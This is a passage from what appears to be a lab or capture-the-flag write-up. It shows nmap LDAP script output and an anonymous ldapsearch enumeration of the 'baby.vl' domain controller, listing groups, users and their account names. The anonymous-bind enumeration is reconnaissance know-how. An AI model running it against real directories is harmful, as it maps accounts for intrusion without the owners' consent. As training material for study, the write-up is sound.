|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: group
|         cn: Denied RODC Password Replication Group
|         description: Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
|         member: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
|         member: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
|         member: CN=Domain Admins,CN=Users,DC=baby,DC=vl
|         member: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
|         member: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
|         member: CN=Schema Admins,CN=Users,DC=baby,DC=vl
|         member: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
|         member: CN=krbtgt,CN=Users,DC=baby,DC=vl
|         distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:51:58 UTC
|         whenChanged: 2021/11/21 14:51:58 UTC
|         uSNCreated: 12405
|         uSNChanged: 12433
|         name: Denied RODC Password Replication Group
|         objectGUID: 1c915516-23d2-da43-bee2-cdd9b59d2a9
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-572
|         sAMAccountName: Denied RODC Password Replication Group
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
|     dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: group
|         cn: Enterprise Read-only Domain Controllers
|         description: Members of this group are Read-Only Domain Controllers in the enterprise
|         distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:51:58 UTC
|         whenChanged: 2021/11/21 14:51:58 UTC
|         uSNCreated: 12429
|         uSNChanged: 12431
|         name: Enterprise Read-only Domain Controllers
|         objectGUID: 161d755-7efd-414e-a4b-51abb86961b
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-498
|         sAMAccountName: Enterprise Read-only Domain Controllers
|         sAMAccountType: 268435456
|         groupType: -2147483640
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
| 
| 
|_Result limited to 20 objects (see ldap.maxobjects)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=baby,DC=vl
|       ldapServiceName: baby.vl:babydc$@BABY.VL
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=baby,DC=vl
|       serverName: CN=BABYDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=baby,DC=vl
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=baby,DC=vl
|       namingContexts: DC=baby,DC=vl
|       namingContexts: CN=Configuration,DC=baby,DC=vl
|       namingContexts: CN=Schema,CN=Configuration,DC=baby,DC=vl
|       namingContexts: DC=DomainDnsZones,DC=baby,DC=vl
|       namingContexts: DC=ForestDnsZones,DC=baby,DC=vl
|       isSynchronized: TRUE
|       highestCommittedUSN: 32813
|       dsServiceName: CN=NTDS Settings,CN=BABYDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=baby,DC=vl
|       dnsHostName: BabyDC.baby.vl
|       defaultNamingContext: DC=baby,DC=vl
|       currentTime: 20240215102520.0Z
|_      configurationNamingContext: CN=Configuration,DC=baby,DC=vl
```

Yeyy, with this one we've got some users:

```
ldapsearch -x -H ldap://10.10.65.83 -D '' -w '' -b "DC=baby,DC=vl"   
# extended LDIF
#
# LDAPv3
# base <DC=baby,DC=vl> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# baby.vl
dn: DC=baby,DC=vl

# Administrator, Users, baby.vl
dn: CN=Administrator,CN=Users,DC=baby,DC=vl

# Guest, Users, baby.vl
dn: CN=Guest,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Guest
description: Built-in account for guest access to the computer/domain
distinguishedName: CN=Guest,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121144952.0Z
whenChanged: 20211121144952.0Z
uSNCreated: 8197
memberOf: CN=Guests,CN=Builtin,DC=baby,DC=vl
uSNChanged: 8197
name: Guest
objectGUID:: 8XThJOa14ESxUfIZL3Bd9A==
userAccountControl: 66082
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 514
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtW9QEAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Guest
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# krbtgt, Users, baby.vl
dn: CN=krbtgt,CN=Users,DC=baby,DC=vl

# Domain Computers, Users, baby.vl
dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Domain Computers
description: All workstations and servers joined to the domain
distinguishedName: CN=Domain Computers,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12330
uSNChanged: 12332
name: Domain Computers
objectGUID:: 8qKP6f2OYESDGo4yvCZhJg==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWAwIAAA==
sAMAccountName: Domain Computers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Controllers, Users, baby.vl
dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl

# Schema Admins, Users, baby.vl
dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl

# Enterprise Admins, Users, baby.vl
dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl

# Cert Publishers, Users, baby.vl
dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Cert Publishers
description: Members of this group are permitted to publish certificates to th
 e directory
distinguishedName: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12342
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
uSNChanged: 12344
name: Cert Publishers
objectGUID:: x28ME5jSJ0W4XxnLFk8cGQ==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWBQIAAA==
sAMAccountName: Cert Publishers
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Admins, Users, baby.vl
dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl

# Domain Users, Users, baby.vl
dn: CN=Domain Users,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Domain Users
description: All domain users
distinguishedName: CN=Domain Users,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12348
memberOf: CN=Users,CN=Builtin,DC=baby,DC=vl
uSNChanged: 12350
name: Domain Users
objectGUID:: yrTYUBBtnkyRqzm+ARpbng==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWAQIAAA==
sAMAccountName: Domain Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Guests, Users, baby.vl
dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Domain Guests
description: All domain guests
distinguishedName: CN=Domain Guests,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12351
memberOf: CN=Guests,CN=Builtin,DC=baby,DC=vl
uSNChanged: 12353
name: Domain Guests
objectGUID:: 7f8QJoNCoka655vMSJ2Zww==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWAgIAAA==
sAMAccountName: Domain Guests
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Group Policy Creator Owners, Users, baby.vl
dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Group Policy Creator Owners
description: Members in this group can modify group policy for the domain
member: CN=Administrator,CN=Users,DC=baby,DC=vl
distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12354
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
uSNChanged: 12391
name: Group Policy Creator Owners
objectGUID:: W6ir0I0zIU+vqIk7rbI/CQ==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWCAIAAA==
sAMAccountName: Group Policy Creator Owners
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# RAS and IAS Servers, Users, baby.vl
dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: RAS and IAS Servers
description: Servers in this group can access remote access properties of user
 s
distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12357
uSNChanged: 12359
name: RAS and IAS Servers
objectGUID:: wBcSheG2P0uiSxTMBNBFRw==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWKQIAAA==
sAMAccountName: RAS and IAS Servers
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Allowed RODC Password Replication Group, Users, baby.vl
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Allowed RODC Password Replication Group
description: Members in this group can have their passwords replicated to all 
 read-only domain controllers in the domain
distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby
 ,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12402
uSNChanged: 12404
name: Allowed RODC Password Replication Group
objectGUID:: ejILJr5sg0SodTROtBWkKA==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWOwIAAA==
sAMAccountName: Allowed RODC Password Replication Group
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Denied RODC Password Replication Group, Users, baby.vl
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Denied RODC Password Replication Group
description: Members in this group cannot have their passwords replicated to a
 ny read-only domain controllers in the domain
member: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
member: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
member: CN=Domain Admins,CN=Users,DC=baby,DC=vl
member: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
member: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
member: CN=Schema Admins,CN=Users,DC=baby,DC=vl
member: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
member: CN=krbtgt,CN=Users,DC=baby,DC=vl
distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,
 DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12405
uSNChanged: 12433
name: Denied RODC Password Replication Group
objectGUID:: FlWRHCPS2kO+4s3ZtZ0CqQ==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWPAIAAA==
sAMAccountName: Denied RODC Password Replication Group
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Read-only Domain Controllers, Users, baby.vl
dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl

# Enterprise Read-only Domain Controllers, Users, baby.vl
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Enterprise Read-only Domain Controllers
description: Members of this group are Read-Only Domain Controllers in the ent
 erprise
distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby
 ,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12429
uSNChanged: 12431
name: Enterprise Read-only Domain Controllers
objectGUID:: VdcBFn79QU6kC1EKu4aWGw==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtW8gEAAA==
sAMAccountName: Enterprise Read-only Domain Controllers
sAMAccountType: 268435456
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Cloneable Domain Controllers, Users, baby.vl
dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Cloneable Domain Controllers
description: Members of this group that are domain controllers may be cloned.
distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12440
uSNChanged: 12442
name: Cloneable Domain Controllers
objectGUID:: AQdidj96k0yKAh5HXwjWWg==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWCgIAAA==
sAMAccountName: Cloneable Domain Controllers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Protected Users, Users, baby.vl
dn: CN=Protected Users,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Protected Users
description: Members of this group are afforded additional protections against
  authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=
 298939 for more information.
distinguishedName: CN=Protected Users,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12445
uSNChanged: 12447
name: Protected Users
objectGUID:: H0/844KdmEyf+3raVrqw6w==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWDQIAAA==
sAMAccountName: Protected Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Key Admins, Users, baby.vl
dn: CN=Key Admins,CN=Users,DC=baby,DC=vl

# Enterprise Key Admins, Users, baby.vl
dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl

# DnsAdmins, Users, baby.vl
dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: DnsAdmins
description: DNS Administrators Group
distinguishedName: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145238.0Z
whenChanged: 20211121145238.0Z
uSNCreated: 12486
uSNChanged: 12488
name: DnsAdmins
objectGUID:: jebp5c9rh0OaBfewI/Q3IQ==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWTQQAAA==
sAMAccountName: DnsAdmins
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 16010101000001.0Z

# DnsUpdateProxy, Users, baby.vl
dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: DnsUpdateProxy
description: DNS clients who are permitted to perform dynamic updates on behal
 f of some other clients (such as DHCP servers).
distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145238.0Z
whenChanged: 20211121145238.0Z
uSNCreated: 12491
uSNChanged: 12491
name: DnsUpdateProxy
objectGUID:: Yc+jX1fev062aq+aBhDmbQ==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWTgQAAA==
sAMAccountName: DnsUpdateProxy
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 16010101000001.0Z

# dev, Users, baby.vl
dn: CN=dev,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: dev
member: CN=Ian Walker,OU=dev,DC=baby,DC=vl
member: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
member: CN=Hugh George,OU=dev,DC=baby,DC=vl
member: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
member: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
distinguishedName: CN=dev,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151102.0Z
whenChanged: 20211121151103.0Z
displayName: dev
uSNCreated: 12789
uSNChanged: 12840
name: dev
objectGUID:: YbzrRV+4J0W4be5Cc4WJiQ==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWTwQAAA==
sAMAccountName: dev
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 16010101000001.0Z

# Jacqueline Barnett, dev, baby.vl
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Jacqueline Barnett
sn: Barnett
givenName: Jacqueline
distinguishedName: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151103.0Z
whenChanged: 20211121151103.0Z
displayName: Jacqueline Barnett
uSNCreated: 12793
memberOf: CN=dev,CN=Users,DC=baby,DC=vl
uSNChanged: 12798
name: Jacqueline Barnett
objectGUID:: /Lm9eucHIkS9Gr+pwGrvHA==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810632000928
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWUAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Jacqueline.Barnett
sAMAccountType: 805306368
userPrincipalName: Jacqueline.Barnett@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Ashley Webb, dev, baby.vl
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ashley Webb
sn: Webb
givenName: Ashley
distinguishedName: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151103.0Z
whenChanged: 20211121151103.0Z
displayName: Ashley Webb
uSNCreated: 12803
memberOf: CN=dev,CN=Users,DC=baby,DC=vl
uSNChanged: 12808
name: Ashley Webb
objectGUID:: P1UeCcUZGUO6xywh/3Gw/g==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810633407081
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Ashley.Webb
sAMAccountType: 805306368
userPrincipalName: Ashley.Webb@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Hugh George, dev, baby.vl
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Hugh George
sn: George
givenName: Hugh
distinguishedName: CN=Hugh George,OU=dev,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151103.0Z
whenChanged: 20211121151103.0Z
displayName: Hugh George
uSNCreated: 12813
memberOf: CN=dev,CN=Users,DC=baby,DC=vl
uSNChanged: 12818
name: Hugh George
objectGUID:: kzlvIum6eEqohHq3BwrYoA==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810634363083
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWUgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Hugh.George
sAMAccountType: 805306368
userPrincipalName: Hugh.George@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Leonard Dyer, dev, baby.vl
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Leonard Dyer
sn: Dyer
givenName: Leonard
distinguishedName: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151103.0Z
whenChanged: 20211121151103.0Z
displayName: Leonard Dyer
uSNCreated: 12823
memberOf: CN=dev,CN=Users,DC=baby,DC=vl
uSNChanged: 12828
name: Leonard Dyer
objectGUID:: VkMQnkPgw0GAkDCiq9LOhA==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810635678033
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWUwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Leonard.Dyer
sAMAccountType: 805306368
userPrincipalName: Leonard.Dyer@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Ian Walker, dev, baby.vl
dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl

# it, Users, baby.vl
dn: CN=it,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: it
member: CN=Teresa Bell,OU=it,DC=baby,DC=vl
member: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
member: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
member: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
member: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
distinguishedName: CN=it,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151108.0Z
displayName: it
uSNCreated: 12845
memberOf: CN=Remote Management Users,CN=Builtin,DC=baby,DC=vl
uSNChanged: 12896
name: it
objectGUID:: qeenEG1110W2UCafhBWyfA==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWVQQAAA==
sAMAccountName: it
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 16010101000001.0Z

# Connor Wilkinson, it, baby.vl
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Connor Wilkinson
sn: Wilkinson
givenName: Connor
distinguishedName: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
instanceType: 4
